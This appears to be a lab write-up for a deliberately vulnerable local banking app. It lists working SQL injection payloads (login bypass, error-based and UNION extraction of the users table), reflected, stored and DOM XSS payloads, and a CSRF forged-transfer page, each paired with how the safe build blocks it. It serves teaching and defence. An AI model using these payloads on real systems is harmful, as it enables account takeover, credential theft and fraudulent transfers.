# Part 2 — Working Payloads (all verified live)

For the Word report: each payload below was run against the live app and
confirmed. For every one, screenshot (a) the attack succeeding in the
**vulnerable** version and (b) the same attack **blocked** in the safe version.

Log in first. For the attacks that need a session, either exploit the login
(below) or sign in as `ali` / `ali-banking-pw`.

---

## SQL Injection

### Level 1 — Easy: login bypass
On the login form:
- **Username:** `admin'-- ` (note the trailing space) — or `' OR '1'='1'-- `
- **Password:** anything

Result: logged in as **Aisha Admin** without the password.
Why: the query becomes `... WHERE username='admin'-- ' AND password='...'`; the
`-- ` comments out the password check.

**Safe version:** rejected (`Invalid username format` / `Invalid credentials`) —
the query is parameterised.

### Level 2 — Intermediate: error-based extraction
In the transaction **search** box:
```
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))-- 
```
Result: the page prints `XPATH syntax error: '~Sup3rSecret!2026'` — the admin
password leaked through the error message.

**Safe version:** generic "Search failed." — no DB internals leaked.

### Level 3 — Advanced: UNION chain (columns → tables → columns → data)
In the search box, run these in sequence:

1. **Column count** (works up to 3, errors at 4 → 3 columns):
   ```
   ' ORDER BY 3-- 
   ```
2. **Enumerate tables/columns** via `information_schema`:
   ```
   ' UNION SELECT table_name,column_name,1 FROM information_schema.columns WHERE table_schema=database()-- 
   ```
   Reveals `users.username`, `users.password`, `users.balance`, etc.
3. **Dump the credentials:**
   ```
   ' UNION SELECT username,password,1 FROM users-- 
   ```
   Returns: `admin / Sup3rSecret!2026`, `ali / ali-banking-pw`,
   `ayesha / ayesha-pw-2026`, `fatima / fatima!secure`.

**Safe version:** the whole UNION string is treated as a literal search term;
no extra rows, no credentials.

---

## Cross-Site Scripting (XSS)

### Reflected
Open (while logged in):
```
http://localhost:3000/search?q=<script>alert('reflected-xss')</script>
```
The script is reflected unescaped into the page and runs.
**Safe:** rendered as text `&lt;script&gt;...` — no execution.

### Stored
On the dashboard, save a note with body:
```
<img src=x onerror=alert('stored-xss')>
```
or
```
<script>alert('stored-xss')</script>
```
It is saved to the DB and runs for anyone who views the dashboard afterwards.
**Safe:** shown as literal text.

### DOM-based
Open the **Statement viewer** and put the payload in the URL fragment:
```
http://localhost:3000/dom#<img src=x onerror=alert('DOM-XSS')>
```
`public/dom.js` writes `location.hash` into `innerHTML` — the server never sees
it. **Safe:** the script uses `textContent`, so it is displayed, not executed.

---

## CSRF — forged fund transfer

1. Log in as a victim (e.g. `ali`) in the browser.
2. In the **same browser**, open the attacker page:
   ```
   http://localhost:3000/attacker/csrf.html
   ```
   (a fake "free iPhone" page). It silently auto-submits a transfer of 5000 to
   account `66666666`.
3. Back on the dashboard, the victim's balance has dropped — no confirmation,
   no token.

Verified via API: balance went `$245000.00 → $240000.00` on a POST to
`/transfer` that carried **no CSRF token**.

**Safe version:** the same forged POST returns **HTTP 403** (missing/invalid CSRF
token), and the `SameSite=Strict` cookie is a second layer of defense.

---

## Quick toggle for screenshots
```powershell
docker compose up -d --build            # vulnerable (attacks work)
$env:MODE="safe"; docker compose up -d  # safe (attacks blocked)
Remove-Item Env:\MODE                    # back to default when done
```
